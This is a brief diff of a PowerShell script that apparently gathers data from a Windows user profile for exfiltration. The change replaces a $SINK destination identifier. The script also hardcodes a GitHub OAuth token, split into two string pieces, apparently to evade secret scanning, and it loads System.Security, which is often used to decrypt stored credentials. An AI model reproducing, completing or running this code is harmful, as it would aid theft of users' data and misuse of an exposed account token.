@@ -3,7 +3,7 @@ try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls1
 Add-Type -AssemblyName System.Security
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $T=('gho_w5O107fup8ULp6t'+'EFsW9V3QEEXSHtx3m9xka')
-$SINK=@('f8750db7a6ab8f4b7f6fc0f9d7d34dcf')
+$SINK=@('0fe7146bfba741719d73b45d37203314')
 $H=$env:COMPUTERNAME; if(-not $H){$H='win'}
 $W=[string]([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())
 $U=$env:USERPROFILE; if(-not $U){$U='C:\Users\brian'}
